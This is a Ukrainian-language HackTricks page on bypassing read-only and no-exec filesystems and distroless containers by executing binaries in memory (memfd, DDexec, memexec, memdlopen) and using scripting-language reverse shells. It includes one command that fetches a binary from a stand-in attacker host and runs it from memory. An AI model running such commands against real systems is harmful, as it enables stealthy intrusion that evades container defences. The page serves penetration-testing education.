# Обхід FS захистів: тільки для читання / без виконання / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Відео

У наступних відео ви можете знайти техніки, згадані на цій сторінці, пояснені більш детально:

- [**DEF CON 31 - Дослідження маніпуляцій з пам'яттю Linux для прихованості та ухилення**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Приховані вторгнення з DDexec-ng та in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## сценарій тільки для читання / без виконання

Все частіше можна зустріти машини Linux, змонтовані з **захистом файлової системи тільки для читання (ro)**, особливо в контейнерах. Це пов'язано з тим, що запустити контейнер з файловою системою ro так само просто, як встановити **`readOnlyRootFilesystem: true`** у `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Однак, навіть якщо файлова система змонтована як ro, **`/dev/shm`** все ще буде записуваним, тому це неправда, що ми не можемо нічого записати на диск. Проте, ця папка буде **змонтована з захистом без виконання**, тому якщо ви завантажите бінарний файл сюди, ви **не зможете його виконати**.

> [!WARNING]
> З точки зору червоної команди, це ускладнює **завантаження та виконання** бінарних файлів, які вже не знаходяться в системі (як бекдори або енумератори, такі як `kubectl`).

## Найпростіший обхід: Скрипти

Зверніть увагу, що я згадував бінарні файли, ви можете **виконувати будь-який скрипт**, якщо інтерпретатор знаходиться всередині машини, наприклад, **shell-скрипт**, якщо `sh` присутній, або **python** **скрипт**, якщо `python` встановлений.

Однак цього недостатньо, щоб виконати ваш бінарний бекдор або інші бінарні інструменти, які вам можуть знадобитися.

## Обходи пам'яті

Якщо ви хочете виконати бінарний файл, але файлова система цього не дозволяє, найкращий спосіб зробити це - **виконати його з пам'яті**, оскільки **захисти не застосовуються там**.

### Обхід FD + exec syscall

Якщо у вас є потужні скриптові движки всередині машини, такі як **Python**, **Perl** або **Ruby**, ви можете завантажити бінарний файл для виконання з пам'яті, зберегти його в дескрипторі пам'яті (`create_memfd` syscall), який не буде захищений цими захистами, а потім викликати **`exec` syscall**, вказуючи **fd як файл для виконання**.

Для цього ви можете легко використовувати проект [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви можете передати йому бінарний файл, і він згенерує скрипт у вказаній мові з **бінарним файлом, стиснутим і b64 закодованим** з інструкціями для **декодування та розпакування** його в **fd**, створеному за допомогою виклику `create_memfd` syscall, і викликом **exec** syscall для його виконання.

> [!WARNING]
> Це не працює в інших скриптових мовах, таких як PHP або Node, оскільки вони не мають жодного **за замовчуванням способу викликати сирі системні виклики** з скрипту, тому неможливо викликати `create_memfd`, щоб створити **дескриптор пам'яті** для зберігання бінарного файлу.
>
> Більше того, створення **звичайного дескриптора** з файлом у `/dev/shm` не спрацює, оскільки вам не дозволять його виконати, оскільки **захист без виконання** буде застосований.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) - це техніка, яка дозволяє вам **модифікувати пам'ять вашого власного процесу** шляхом перезапису його **`/proc/self/mem`**.

Отже, **контролюючи асемблерний код**, який виконується процесом, ви можете написати **shellcode** і "мутувати" процес, щоб **виконати будь-який довільний код**.

> [!TIP]
> **DDexec / EverythingExec** дозволить вам завантажити та **виконати** ваш власний **shellcode** або **будь-який бінарний файл** з **пам'яті**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Для отримання додаткової інформації про цю техніку перевірте Github або:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) є природним наступним кроком DDexec. Це **DDexec shellcode demonised**, тому що щоразу, коли ви хочете **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec, ви можете просто запустити shellcode memexec за допомогою техніки DDexec, а потім **спілкуватися з цим демоном, щоб передати нові бінарні файли для завантаження та виконання**.

Ви можете знайти приклад того, як використовувати **memexec для виконання бінарних файлів з PHP реверс-шелу** за адресою [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

З подібною метою до DDexec, техніка [**memdlopen**](https://github.com/arget13/memdlopen) дозволяє **легше завантажувати бінарні файли** в пам'ять для подальшого виконання. Це може навіть дозволити завантажувати бінарні файли з залежностями.

## Distroless Bypass

### Що таке distroless

Контейнери distroless містять лише **найнеобхідні компоненти для запуску конкретного застосунку або служби**, такі як бібліотеки та залежності виконання, але виключають більші компоненти, такі як менеджер пакетів, оболонка або системні утиліти.

Мета контейнерів distroless полягає в тому, щоб **зменшити поверхню атаки контейнерів, усунувши непотрібні компоненти** та мінімізувати кількість вразливостей, які можуть бути використані.

### Реверс-шел

У контейнері distroless ви, можливо, **навіть не знайдете `sh` або `bash`** для отримання звичайної оболонки. Ви також не знайдете бінарні файли, такі як `ls`, `whoami`, `id`... все, що ви зазвичай запускаєте в системі.

> [!WARNING]
> Тому ви **не зможете** отримати **реверс-шел** або **перерахувати** систему, як зазвичай.

Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-якої **скриптової мови**.

> [!TIP]
> Використовуючи скриптову мову, ви могли б **перерахувати систему**, використовуючи можливості мови.

Якщо немає **захистів `read-only/no-exec`**, ви могли б зловживати своїм реверс-шелом, щоб **записувати у файлову систему свої бінарні файли** та **виконувати** їх.

> [!TIP]
> Однак у таких контейнерах ці захисти зазвичай існують, але ви могли б використовувати **попередні техніки виконання в пам'яті, щоб обійти їх**.

Ви можете знайти **приклади** того, як **експлуатувати деякі вразливості RCE**, щоб отримати реверс-шели скриптових мов та виконувати бінарні файли з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
